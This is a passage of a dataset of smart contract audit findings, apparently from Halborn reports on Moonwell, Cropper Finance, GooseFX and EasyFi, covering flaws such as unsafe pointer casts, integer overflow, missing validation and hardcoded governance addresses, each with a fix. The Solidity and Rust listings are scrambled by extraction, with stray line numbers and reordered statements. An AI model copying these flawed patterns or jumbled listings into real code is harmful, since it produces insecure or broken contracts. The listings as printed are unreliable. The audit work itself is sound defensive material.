Audits/Moonwell_Finance_Governance_and_Timelock_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Role-only privileged functions that change critical parameters should emit events. Events allow changing parameters to be captured so that off-chain tools/interfaces can record such changes with timelocks allowing users to evaluate them and consider whether they would like to engage/exit based on how they perceive the changes to affect reliability of the protocol or profitability of implemented financial services. The alternative of directly querying the state of the on-chain contract for such changes is not considered practical for most users/usages. Code Location: Listing 3: GovernorAlpha.sol function setProposalMaxOperations ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); proposalMaxOperations = newValue ; } 1 2 3 4 5 6  place , once proposed 7 8 9 10 11 12 13 14 15 16 17 } // / @notice The delay before voting on a proposal may take uint public votingDelay = 1 days ; function setVotingDelay ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); votingDelay = newValue ; // / @notice The duration of voting on a proposal , in blocks uint public votingPeriod = 3 days ; function setVotingPeriod ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); 16 18 19 } votingPeriod = newValue ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Add events to all admin/privileged functions that change critical param- eters. Remediation Plan: SOLVED: The Moonwell Team solved this issue by adding events to functions. Commit ID: 4e8bec5926339106c225d0f85120ba182e52f2dd 17 ", "labels": ["Halborn", "Moonwell_Finance_Governance_and_Timelock_Updates", "Severity: Informational"]}, {"title": "PLACE VARIABLE DEFINITION AT THE BEGINNING OF THE CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_and_Timelock_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Regarding Solidity Style Guide, the variable definition can be moved to the beginning of the contract. Code Location: Listing 4: GovernorAlpha.sol function setProposalMaxOperations ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); proposalMaxOperations = newValue ; } 1 2 3 4 5 6  place , once proposed 7 8 9 10 11 12 13 14 15 16 17 18 19 } } // / @notice The delay before voting on a proposal may take uint public votingDelay = 1 days ; function setVotingDelay ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); votingDelay = newValue ; // / @notice The duration of voting on a proposal , in blocks uint public votingPeriod = 3 days ; function setVotingPeriod ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); votingPeriod = newValue ; Risk Level: Likelihood - 1 Impact - 1 18 Recommendation: Consider moving the variable definition to the beginning of the contract. Remediation Plan: SOLVED: The Moonwell Team solved this issue by placing variables at the beginning of the contract. Commit ID: 4e8bec5926339106c225d0f85120ba182e52f2dd 19 ", "labels": ["Halborn", "Moonwell_Finance_Governance_and_Timelock_Updates", "Severity: Informational"]}, {"title": "CHANGING FUNCTION VISIBILITY FROM PUBLIC TO EXTERNAL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_and_Timelock_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "There are the functions declared as public that are never called internally It is good practice to mark such functions as within the contract. external, as this saves gas (especially in the case where the function takes arguments, since external functions can read arguments directly from calldata instead of having to allocate memory). Code Location: Listing 5: GovernorAlpha.sol function setProposalMaxOperations ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); proposalMaxOperations = newValue ; } 1 2 3 4 5 6  place , once proposed 7 8 9 10 11 12 13 14 15 16 17 18 19 } } // / @notice The delay before voting on a proposal may take uint public votingDelay = 1 days ; function setVotingDelay ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); votingDelay = newValue ; // / @notice The duration of voting on a proposal , in blocks uint public votingPeriod = 3 days ; function setVotingPeriod ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); votingPeriod = newValue ; 20 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Functions should be marked as an external for gas optimization. Listing 6 1 public - everyone can access 2 3 external - Cannot be accessed internally , only externally 4 5 internal - only this contract and contracts derived from it can  access 6 7 private - can only be accessed from this contract Remediation Plan: SOLVED: The Moonwell Team solved this issue by setting external functions. Commit ID: 4e8bec5926339106c225d0f85120ba182e52f2dd 21 THANK YOU FOR CHOOSING", "labels": ["Halborn", "Moonwell_Finance_Governance_and_Timelock_Updates", "Severity: Informational"]}, {"title": "HARDCODED GOVERNANCE ADDRESSES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_AMM_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "Several important governance accounts/wallets addresses are hardcoded in constraints.rs. In case those addresses are compromised the program owner has no way of updating them thus putting users funds at risk. Code Location: Listing 1: constraints.rs (Lines 59) 58 #[ cfg ( feature = \" production \") ] 59 const OWNER_KEY : & str = env! ( \" SWAP_PROGRAM_OWNER_FEE_ADDRESS \"); Listing 2: constraints.rs (Lines 84) Some ( SwapConstraints { #[ cfg ( feature = \" production \") ] { 80 pub const SWAP_CONSTRAINTS : Option < SwapConstraints > = { 81 82 83 84 85 86 87 88 owner_key : OWNER_KEY , valid_curve_types : VALID_CURVE_TYPES , fees : FEES , }) } Listing 3: processor.rs (Lines 34) 33 use std :: convert :: TryInto ; 34 const FEE_WALLET_ADDRESS :& str = \"2 Pv5mjmKYAtXNpr3mcsXf7HjtS3fieJeFoWPATVT5rWa \" ; 35 const WSOL_MINT_ADDRESS :& str = \" So11111111111111111111111111111111111111112 \" ; 36 // / Program state handler . 37 pub struct Processor {} 13 Risk Level: Likelihood - 1 Impact - 5 Recommendations: Consider making the governance addresses modifiable and implement a func- tion to update these addresses in case they are compromised. Remediation Plan: SOLVED: Fixed in commit 691220b25ac065ca68dfffde9f9e2bac72d3da04. 14 ", "labels": ["Halborn", "Cropper_Finance_AMM_Program", "Severity: Medium"]}, {"title": "SERUM DEX MARKET ACCOUNT OWNER VALIDATION MISSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_AMM_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "One of the accounts the process_initialize function requires is a Serum DEX market ID. The accounts address is one of swap properties, however the owner of this account is not validated to match the Serum DEX program ID. This allows users to initialize a swap with an arbitrary account owned by any program instead of a legitimate Serum DEX market. Code Location: Listing 4: processor.rs (Lines 239) 236 let destination_info = next_account_info ( account_info_iter ) ?; 237 let token_program_info = next_account_info ( account_info_iter ) ?; 238 let dex_program_info = next_account_info ( account_info_iter ) ?; 239 let market_info = next_account_info ( account_info_iter ) ?; 240 241 // validate account info 242 let token_program_id = * token_program_info . key ; 243 if SwapVersion :: is_initialized (& swap_info . data . borrow () ) { 244 245 } return Err ( AmmError :: AlreadyInUse . into () ); Listing 5: processor.rs (Lines 348) 342 // Save the pool account info 343 let obj = SwapVersion :: SwapV1 ( SwapV1 { 344 345 346 347 348 349 is_initialized : true , nonce , amm_id : * amm_id_info . key , dex_program_id : * dex_program_info . key , market_id : * market_info . key , token_program_id , 15 Risk Level: Likelihood - 2 Impact - 2 Recommendations: Validate the supplied market account owner address to match the Serum DEX program ID. Remediation Plan: SOLVED: Fixed in commit 17d66786ce4f9c687cba9212b59773ba688c9c78. 16 ", "labels": ["Halborn", "Cropper_Finance_AMM_Program", "Severity: Low"]}, {"title": "USE OF UNSAFE CODE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_AMM_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "Although Rust language programming is memory safe by default, it allows the user to provide the unsafe keyword/feature to apply less restrictions than normal. Using unsafe code is possible to dereferencing a raw pointer, reading or writing a mutable or external static variable, accessing a field of a union other than to assign to it, calling an unsafe function The security consequences of using or implementing an unsafe trait. unsafe code in Rust increase the possibilities to be exposed to several vulnerabilities or bugs provoking memory leaks. The worst cases can expose sensitive information left in memory, or gain remote code execution by taking control of the pointer in memory, and redirecting it to malicious code execution sectors controlled by an attacker. Code Location: Listing 6: amm_instruction (Lines 327) if input . len () < size_of :: < u8 >() + size_of :: <T >() { 314 pub fn unpack <T >( input : &[ u8 ]) -> Result <& T , ProgramError > { 315 316 317 318 319 } #[ allow ( clippy :: cast_ptr_alignment ) ] let val : & T = unsafe { &*(& input [1] as * const u8 as * const T) return Err ( ProgramError :: InvalidAccountData ); }; Ok ( val ) 320 321 } Risk Level: Likelihood - 2 Impact - 2 17 Recommendations: It is recommended not to use unsafe code in order to avoid exposed possible vulnerabilities or bugs triggering memory leaks. Remediation Plan: SOLVED: Fixed in commit 1e9ea9d6716d0314bc6c8465b4b6068944cf73c5. 18 ", "labels": ["Halborn", "Cropper_Finance_AMM_Program", "Severity: Low"]}, {"title": "BYTE ARRAY LENGTH VALIDATION MISSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_AMM_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "The unpack_from_slice functions defined in curve/base.rs, curve/fees.rs , curve/constant_price, curve/offset.rs and curve/stable.rs parse user- supplied byte arrays to struct fields. Neither of those functions however verify if the user-supplied data length matches the expected ones which may lead to panics when the length is incorrect. Code Location: Listing 7: curve/base.rs (Lines 213) let input = array_ref! [ input , 0 , 33]; #[ allow ( clippy :: ptr_offset_with_cast )] let ( curve_type , calculator ) = array_refs! [ input , 1, 32]; let curve_type = curve_type [0]. try_into () ?; Ok ( Self { 209 // / Unpacks a byte buffer into a SwapCurve 210 fn unpack_from_slice ( input : &[ u8 ]) -> Result < Self , ProgramError > { 211 212 213 214 215 216 217 218 219 curve_type , calculator : match curve_type { Box :: new ( ConstantProductCurve :: unpack_from_slice ( CurveType :: ConstantProduct => { calculator ) ?) } CurveType :: ConstantPrice => { Box :: new ( ConstantPriceCurve :: unpack_from_slice ( calculator ) ?) } CurveType :: Stable => Box :: new ( StableCurve :: unpack_from_slice ( calculator ) ?) , CurveType :: Offset => Box :: new ( OffsetCurve :: unpack_from_slice ( calculator ) ?) , 220 221 222 223 224 225 226 227 228 } }, }) 19 Listing 8: fees.rs (Lines 115) let input = array_ref! [ input , 0 , 24]; #[ allow ( clippy :: ptr_offset_with_cast )] let ( 114 fn unpack_from_slice ( input : &[ u8 ]) -> Result < Fees , ProgramError > { 115 116 117 118 119 120 121 return_fee_numerator , fixed_fee_numerator , fee_denominator , ) = array_refs! [ input , 8, 8, 8]; Listing 9: curve/constant_price.rs (Lines 253) 252 fn unpack_from_slice ( input : &[ u8 ]) -> Result < ConstantPriceCurve , ProgramError > { let token_b_price = array_ref! [ input , 0, 8]; Ok ( Self { 253 254 255 256 257 } 258 259 ```{ language = rust caption = \" curve / offset . rs \" firstnumber =174 hlines token_b_price : u64 :: from_le_bytes (* token_b_price ) , }) =175} 260 fn unpack_from_slice ( input : &[ u8 ]) -> Result < OffsetCurve , ProgramError > { let token_b_offset = array_ref! [ input , 0, 8]; Ok ( Self { token_b_offset : u64 :: from_le_bytes (* token_b_offset ) , }) 261 262 263 264 265 } Listing 10: curve/stable.rs (Lines 336) 335 fn unpack_from_slice ( input : &[ u8 ]) -> Result < StableCurve , ProgramError > { let amp = array_ref! [ input , 0, 8]; Ok ( Self { amp : u64 :: from_le_bytes (* amp ) , }) 336 337 338 339 340 } 20 Risk Level: Likelihood - 1 Impact - 2 Recommendations: Validate the user-supplied data length to match the expected ones before parsing it to struct fields. Remediation Plan: SOLVED: Fixed in commit 691220b25ac065ca68dfffde9f9e2bac72d3da04. 21 ", "labels": ["Halborn", "Cropper_Finance_AMM_Program", "Severity: Informational"]}, {"title": "INITIALISING SWAP WITH FROZEN TOKEN ACCOUNTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_AMM_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "To be initialised, the token swap account requires two token accounts to be provided by the initialising user. Both accounts are checked not to have the same mint and belong to the swap authority however they are not verified not to be frozen, therefore it is possible for a malicious user to create a frozen pool with tokens that cannot effectively be accessed. Code Location: Listing 11: processor.rs (Lines 250,251) 250 let token_a = Self :: unpack_token_account ( token_a_info , & token_program_id ) ?; 251 let token_b = Self :: unpack_token_account ( token_b_info , & token_program_id ) ?; 252 253 let destination = Self :: unpack_token_account ( destination_info , & token_program_id ) ?; 254 let pool_mint = Self :: unpack_mint ( pool_mint_info , & token_program_id ) ?; return Err ( AmmError :: InvalidOwner . into () ); 255 if * authority_info . key != token_a . owner { 256 257 } 258 if * authority_info . key != token_b . owner { 259 260 } return Err ( AmmError :: InvalidOwner . into () ); Listing 12: processor.rs (Lines 294,297,300,303) 294 if token_a . delegate . is_some () { 295 296 } return Err ( AmmError :: InvalidDelegate . into () ); 22 return Err ( AmmError :: InvalidDelegate . into () ); 297 if token_b . delegate . is_some () { 298 299 } 300 if token_a . close_authority . is_some () { 301 302 } 303 if token_b . close_authority . is_some () { 304 305 } return Err ( AmmError :: InvalidCloseAuthority . into () ); return Err ( AmmError :: InvalidCloseAuthority . into () ); Risk Level: Likelihood - 1 Impact - 2 Recommendations: Verify if the state property of both token accounts is not Frozen before initializing the swap. Remediation Plan: SOLVED: Fixed in commit 5a00ce89c4a3da6dcfd6ccba123c5e81ee605308. 23 ", "labels": ["Halborn", "Cropper_Finance_AMM_Program", "Severity: Informational"]}, {"title": "MULTIPLE VULNERABILITIES IN THE FEE VALIDATE METHOD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_AMM_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "The Fee::validate method is tasked with verifying if the user-supplied struct fields can be used in swap/withdraw fee calculation. There is a number if issues with that method: 1. Division by zero in the first if statement: it does not ensure the fee_denominator to be greater than 0 which can lead to division by zero if used in fee calculation. 2. Integer overflow in the second if statement: An overflow happens when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of digits. In this statement two u128 values are added together without checking whether the result is within the range that can be represented with a given number of bits. If it isnt, in Rust the resulting value is specified to wrap as twos complement, resulting in a value either too low or too high considering the circumstances. Although this function are not currently exploitable as the values of its arguments are hardcoded, technically it is still vulnerable and we recommend patching it. Code Location: Listing 13: curve/fees.rs (Lines 79,81) 76 // / Validate that the fees are reasonable 77 pub fn validate (& self ) -> Result <() , AmmError > { 78 79 if self . fee_denominator == 0 && self . fixed_fee_numerator == 0 80 && self . return_fee_numerator == 0{ Ok (() ) 24 81 } else if self . fixed_fee_numerator + self . return_fee_numerator >= self . fee_denominator { Err ( AmmError :: InvalidFee ) } else { Ok (() ) } 82 83 84 85 86 } Risk Level: Likelihood - 1 Impact - 1 Recommendations: In the release mode Rust does not panic on overflows and overflown values wrapabout without any explicit feedback to the user. It is recom- mended then to use vetted safe math libraries for arithmetic operations consistently throughout the smart contract system. Consider replacing the addition operator with Rusts checked_add method and validating the denominators to be greater than 0. Remediation: SOLVED: Fixed in commit 6ca7e12c14edcf5fdd9d28f675b9f4b148d4258f. 25 ", "labels": ["Halborn", "Cropper_Finance_AMM_Program", "Severity: Informational"]}, {"title": "GET PACKED DATA LENGTH FUNCTION RETURNS AMBIGUOUS RESULTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_AMM_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "Each swap operation requires the swap account to be initialised. The account has to allocate a sufficient number of bytes for account (packed) data. This number can be determined with the get_packed_len utility function. However, Cropper prepends this data with a single byte denoting the swap version which the get_packed_len function does not consider thus returning a number one too low. Without manually increasing the allocation space by one it is impossible to create a correct account and in consequence it is impossible to create a swap. Code Location: Listing 14: amm_stats.rs (Lines 65) 60 // / Pack a swap into a byte array , based on its version 61 pub fn pack ( src : Self , dst : & mut [ u8 ]) -> Result <() , ProgramError > { match src { Self :: SwapV1 ( swap_info ) => { dst [0] = 1; SwapV1 :: pack ( swap_info , & mut dst [1..]) } } 62 63 64 65 66 67 68 } Listing 15: amm_stats.rs (Lines 206) const LEN : usize = 411; 202 impl Pack for SwapV1 { 203 204 205 206 207 fn pack_into_slice (& self , output : & mut [ u8 ]) { let output = array_mut_ref! [ output , 0, 411]; let ( 26 208 209 210 211 212 is_initialized , nonce , amm_id , dex_program_id , market_id , Risk Level: Likelihood - 1 Impact - 1 Recommendations: Include the byte denoting swap version in the packed data so the SwapV1 ::get_packed_len function returns the correct number of bytes required. Remediation Plan: SOLVED: Fixed in commit 691220b25ac065ca68dfffde9f9e2bac72d3da04. 27 ", "labels": ["Halborn", "Cropper_Finance_AMM_Program", "Severity: Informational"]}, {"title": "INITIAL POOL LIQUIDITY EDGE CASES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_AMM_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "Regardless of the actual deposit amount or selected curve type users are minted 1,000,000,000 LP tokens on swap initialisation as defined by the This has at least INITIAL_SWAP_POOL_AMOUNT constant in calculator.rs. two consequences for all other liquidity providers: 1. It will be impossible for other users to deposit less then k  10n tokens if the initial deposit is made for an amount of k  109+n tokens (k, n  0) and no withdraws are made because the amount of LP tokens to be minted on each subsequent deposit is calculated based on the current LP token balance. 2. if the initial deposit is for an amount of 1 token and no withdraws are made the pool will hold up to 18.5k tokens (assuming 6 decimal places) Code Location: Listing 16: processor.rs (Lines 329,339) 327 swap_curve . calculator . validate () ?; 328 329 let initial_amount = swap_curve . calculator . new_pool_supply () ; 330 331 // Mint Initial supply 332 Self :: token_mint_to ( 333 334 335 336 337 338 339 340 ) ?; swap_info . key , token_program_info . clone () , pool_mint_info . clone () , destination_info . clone () , authority_info . clone () , nonce , to_u64 ( initial_amount )? , 28 Listing 17: calculator.rs (Lines 101) 98 // / Get the supply for a new pool 99 // / The default implementation is a Balancer - style fixed initial supply 100 fn new_pool_supply (& self ) -> u128 { 101 INITIAL_SWAP_POOL_AMOUNT 102 } Listing 18: calculator.rs (Lines 12) 8 // / Initial amount of pool tokens for swap contract , hard - coded to something 9 // / \" sensible \" given a maximum of u128 . 10 // / Note that on Ethereum , Uniswap uses the geometric mean of all provided 11 // / input amounts , and Balancer uses 100 * 10 ^ 18. 12 pub const INITIAL_SWAP_POOL_AMOUNT : u128 = 1 _000_000_000 ; Risk Level: Likelihood - 1 Impact - 1 Recommendations: Document these edge cases so that the community is more aware of the protocol limitations. 29 ", "labels": ["Halborn", "Cropper_Finance_AMM_Program", "Severity: Informational"]}, {"title": "TOKENS IN FEE VAULTS LOCKED INDEFINITELY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/GooseFX_Swap_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "Users pay operational fees to fee_vault accounts for withdrawing liquidity and swapping tokens. On pool initialisation, the fee_vault token account authority is set to the relevant pools account address, a PDA created from the gfx_swap program id, static seed and the pool address. The gfx_swap program does not allow transferring any fees from vaults which means they are locked in these accounts indefinitely. Code Location: Listing 1: contexts/initialize.rs (Lines 22) 11 #[ derive ( Accounts ) ] 12 #[ instruction ( seed : [ u8 ; 32 ] , pool_bump : u8 , lp_bump : u8 )] 13 pub struct Initialize < ' info > { 14 pub admin : AccountInfo <' info >, // admin account can do privileged operations 15 16 17 18 19 20 21 22 23 #[ account ( init , seeds = [ Pool :: IDENT , & seed ] , bump = pool_bump , payer = payer , )] pub pool : Account < ' info , Pool >, Listing 2: cli/src/bin/create_pool.rs (Lines 53) Cluster :: Devnet , CliKeypair :: copy (& admin ) , CommitmentConfig :: confirmed () , 43 let client = Client :: new_with_options ( 44 45 46 47 ); 48 let program = client . program ( program_id ); 12 49 50 // seed for creating the pool 51 let seed = solana_sdk :: signature :: Keypair :: new () . pubkey () ; 52 53 let ( pool , pool_bump ) = Pool :: get_address_with_bump (& program_id , & seed . to_bytes () ); 54 let ( lp_mint , lp_bump ) = LPMint :: get_address_with_bump (& program_id , & seed . to_bytes () ); 55 56 println! ( \" Creating the LP pool ... \" ); 57 Listing 3: cli/src/bin/create_pool.rs (Lines 20) 19 fn get_address_with_bump ( program_id : & Pubkey , seed : &[ u8 ]) -> ( Pubkey , u8 ) { Pubkey :: find_program_address (&[ Self :: IDENT , seed ], program_id ) 20 21 } Risk Level: Likelihood - 5 Impact - 3 Recommendations: Consider implementing either a governance function to allow transferring tokens from pool fee vaults or change fee vault authority accounts to a one with matching private key. Remediation Plan: SOLVED: The GooseFX team fixed the issue in commit fe70730908889551ce653e18f8dd9b0d1ddfd6ee. 13 ", "labels": ["Halborn", "GooseFX_Swap_Program", "Severity: High"]}, {"title": "POOLS CANNOT BE SUSPENDED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/GooseFX_Swap_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "suspended is one of the fields in the Pool struct. If set to true, all operations on a pool are suspended--swapping,depositing and withdrawing are blocked. This field is set to false by default and its value cannot be modified as the program does not feature any instructions that update pool parameters. Code Location: Listing 4: states/pool.rs (Lines 27) 11 #[ account ] 12 #[ derive ( Default , Debug )] 13 pub struct Pool { 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 } pub seed : [ u8 ; 32] , pub bump : u8 , pub lp_bump : u8 , pub admin : Pubkey , // sorted by token mint addresses pub token_mint_1 : Pubkey , pub token_mint_2 : Pubkey , pub token_vault_1 : Pubkey , pub token_vault_2 : Pubkey , pub mint : Pubkey , // the LP token mint pub fee_vault : Pubkey , pub fees : Fees , pub curve : SwapCurve , pub suspended : bool , Listing 5: contexts/initialize.rs 92 let ( token_vault_1 , token_vault_2 ) = 93 ( token_a_vault . mint , token_b_vault . mint ). sort ( token_a_vault , token_b_vault ) ?; 14 94 let ( token_mint_1 , token_mint_2 ) = ( token_a_mint , token_b_mint ). sort_self () ?; 95 96 pool . admin = admin . key () ; 97 pool . seed = seed ; 98 pool . bump = pool_bump ; 99 pool . lp_bump = lp_bump ; 100 pool . token_mint_1 = token_mint_1 . key () ; 101 pool . token_mint_2 = token_mint_2 . key () ; 102 pool . token_vault_1 = token_vault_1 . key () ; 103 pool . token_vault_2 = token_vault_2 . key () ; 104 pool . mint = lp_token_mint . key () ; 105 pool . fee_vault = lp_token_ata_fee . key () ; 106 pool . fees = fees ; 107 pool . curve = curve ; Risk Level: Likelihood - 2 Impact - 4 Recommendations: Implement an instruction handler for updating pool parameters. Remediation Plan: SOLVED: The GooseFX team fixed the issue in commit fe70730908889551ce653e18f8dd9b0d1ddfd6ee. 15 ", "labels": ["Halborn", "GooseFX_Swap_Program", "Severity: Medium"]}, {"title": "OFFSET CURVE TOKEN MISMATCH", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/GooseFX_Swap_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "The offset curve is one of the swap price curves the gfx_swap program offers. On pool initialization, in the process function in initialize.rs user specify to which of the two tokens the offset should be added. This function however also sorts the tokens by mint address and in case token_b mint happens to be a lower number than token_a the offset will actually be added to token_a instead because the calculator has no concept of token ordering. This might cause the pool config to be exactly opposite to whatever it is expected to be thereby incurring a minimum loss of $0.64 to the pools creator as of the time of writing. Code Location: Listing 6: states/pool.rs (Lines 27) 11 #[ account ] 12 #[ derive ( Default , Debug )] 13 pub struct Pool { 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 } pub seed : [ u8 ; 32] , pub bump : u8 , pub lp_bump : u8 , pub admin : Pubkey , // sorted by token mint addresses pub token_mint_1 : Pubkey , pub token_mint_2 : Pubkey , pub token_vault_1 : Pubkey , pub token_vault_2 : Pubkey , pub mint : Pubkey , // the LP token mint pub fee_vault : Pubkey , pub fees : Fees , pub curve : SwapCurve , pub suspended : bool , 16 Listing 7: contexts/initialize.rs 92 let ( token_vault_1 , token_vault_2 ) = 93 ( token_a_vault . mint , token_b_vault . mint ). sort ( token_a_vault , token_b_vault ) ?; 94 let ( token_mint_1 , token_mint_2 ) = ( token_a_mint , token_b_mint ). sort_self () ?; 95 96 pool . admin = admin . key () ; 97 pool . seed = seed ; 98 pool . bump = pool_bump ; 99 pool . lp_bump = lp_bump ; 100 pool . token_mint_1 = token_mint_1 . key () ; 101 pool . token_mint_2 = token_mint_2 . key () ; 102 pool . token_vault_1 = token_vault_1 . key () ; 103 pool . token_vault_2 = token_vault_2 . key () ; 104 pool . mint = lp_token_mint . key () ; 105 pool . fee_vault = lp_token_ata_fee . key () ; 106 pool . fees = fees ; 107 pool . curve = curve ; Listing 8: src/curve/swap_curve.rs (Lines 46) 33 // / All the supported curve types . We do not use the trait object solution in the SPL . 34 // / Instead , we use enums . 35 #[ enum_dispatch ] 36 #[ repr (C ) ] 37 #[ derive ( Clone , Debug , AnchorDeserialize , AnchorSerialize )] 38 pub enum SwapCurve { 39 // / Uniswap - style constant product curve , invariant = token_a_amount * token_b_amount ConstantProductCurve , // / Flat line , always providing 1:1 from one token to another ConstantPriceCurve , // / Stable , like uniswap , but with wide zone of 1:1 instead of one point StableCurve , // / Offset curve , like Uniswap , but the token B side has a faked offset OffsetCurve , 40 41 42 43 44 45 46 47 } 17 Listing 9: curve/calculators/offset.rs (Lines 20) 15 // / Offset curve , uses ConstantProduct under the hood , but adds an offset to 16 // / one side on swap calculations 17 #[ derive ( Clone , Debug , Default , PartialEq , AnchorDeserialize , AnchorSerialize ) ] 18 pub struct OffsetCurve { 19 20 21 } // / Amount to offset the token B liquidity account pub token_b_offset : u64 , Risk Level: Likelihood - 5 Impact - 2 Recommendations: Remember to assign the offset to the user-selected token on pool ini- tialisation. Remediation Plan: SOLVED: The GooseFX team fixed this issue in commit 57f0e97da665c943b22870e70c3314fdaba19e8b. 18 ", "labels": ["Halborn", "GooseFX_Swap_Program", "Severity: Medium"]}, {"title": "CONSTRAINT FUNCTION ATTRIBUTES ARE NOT PRESERVED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/GooseFX_Swap_Program_Security_Audit_Report_Halborn_Final.pdf", "body": "The suspended function defined in src/constraints.rs is marked with the #[throws] attribute which causes the function to return an error defined in the attributes argument. This function is used by the access_control macro by constraints of several instructions defined in lib.rs. The access_control macro however does not preserve attributes which means the suspended function will never throw an error. Code Location: Listing 10: contexts/constraints.rs (Lines 5) 5 #[ throws ( ProgramError ) ] 6 pub fn suspended ( pool : & Account < '_ , Pool >) { 7 8 } require! ( !pool . suspended , Suspended ); Listing 11: src/lib.rs (Lines 51) 48 #[ account ] 49 #[ derive ( Default , Debug )] 50 #[ throws ( ProgramError ) ] 51 #[ access_control ( suspended (& ctx . accounts . pool ) )] 52 pub fn deposit2 ( 53 54 55 56 57 ) { 58 59 60 61 ctx : Context < Deposit2 >, lp_token_amount : u64 , maximum_token_a_amount : u64 , maximum_token_b_amount : u64 , lp_token_amount , maximum_token_a_amount , maximum_token_b_amount , ctx . accounts . process ( 19 )? 62 63 } anchor-attributes-access-control crate: Listing 12: src/lib.rs (Lines 71) 62 let item_fn = parse_macro_input! ( input as syn :: ItemFn ); 63 64 let fn_vis = item_fn . vis ; 65 let fn_sig = item_fn . sig ; 66 let fn_block = item_fn . block ; 67 68 let fn_stmts = fn_block . stmts ; 69 70 proc_macro :: TokenStream :: from ( quote! { 71 72 73 74 75 76 77 }) 78 } #(# access_control )* # fn_vis # fn_sig { #(# fn_stmts )* } Risk Level: Likelihood - 1 Impact - 1 Recommendations: Upgrade Anchor to commit 5fa263ff176a6f3f1e8fb1e6667da0ec5999b6e9. Remediation Plan: SOLVED: The GooseFX team fixed the issue in commit 91e84b0322696ce9f89906c22e3134de57964294. 20 ", "labels": ["Halborn", "GooseFX_Swap_Program", "Severity: Informational"]}, {"title": "LOCKOUT OWNER ROLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Farming_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The Owner of the contract is usually the account which deploys the As a result, the Owner is able to perform some privileged contract. In the FarmingFactory smart contract, the renounceOwnership actions. function is used to renounce being an owner. The deploy() function in the FarmingFactory smart contract, utilizes new farming reward contract. If an owner is mistakenly renounced administrative access which ends up calling deploy() require msg.sender to be the incorrectly used owner address. In such a case, contracts would have to be redeployed. PoC Steps:  Deploy a FarmingFactory contract.  Renounce an owner of the contract.  Deploy function is not accessible with the current owner of the function. 12 Code Location: farmingFactory.sol Line #840 Listing 1: farmingFactory.sol (Lines 840) 840 841 842 843 844 845 846 847 848 849 850 851 852 853 854 855 856 857 858 859 860 861 862 863 864 function deploy ( address farmingToken , uint256 rewardAmount , uint256 rewardsDuration ) public onlyOwner { FarmingRewardsInfo storage info = farmingRewardsInfoByFarmingToken [ farmingToken ]; require ( info . farmingRewards == address (0) , \" FarmingFactory :: deploy : already deployed \" ); info . farmingRewards = address ( new FarmingRewards ( /* _rewardsDistribution = */ address ( this ) , rewardsToken , farmingToken , rewardsDuration ) ); info . rewardAmount = rewardAmount ; farmingTokens . push ( farmingToken ); } Risk Level: Likelihood - 3 Impact - 3 13 Recommendation: Its recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. As an other solution, Renounce Ownership functionality can be disabled with the following line of codes. Listing 2: Disable Renounce Ownership (Lines 2) 2 3 4 function renounceOwnership () public override onlyOwner { revert ( \" can 't renounceOwnership here \"); // not possible with this smart contract } Remediation Plan: SOLVED: EasyFi team removed renounceOwnership function. 14 ", "labels": ["Halborn", "EasyFi_Farming", "Severity: Medium"]}, {"title": "MISSING ZERO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Farming_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The constructors from FarmingRewards and FarmingFactory contract should perform a zero-address check when receives an address as a user-supplied parameter. 